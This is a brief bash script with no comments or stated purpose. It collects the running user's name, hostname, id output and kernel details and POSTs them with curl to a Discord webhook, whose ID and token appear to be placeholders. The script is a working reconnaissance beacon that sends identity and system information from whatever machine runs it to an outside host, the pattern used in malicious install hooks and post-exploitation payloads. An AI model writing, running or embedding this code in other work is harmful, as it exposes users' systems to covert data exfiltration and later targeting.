#!/usr/bin/env bash
WHOAMI=$(whoami)
HOSTNAME_VAL=$(hostname)
ID_VAL=$(id)
UNAME=$(uname -a)
MSG="$HOSTNAME_VAL $WHOAMI $ID_VAL $UNAME"
curl -s -X POST -H "Content-Type: application/json" -d "{\"content\":\"$MSG\"}" "https://discord.com/api/webhooks/12345678901234567890/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTuvwx"
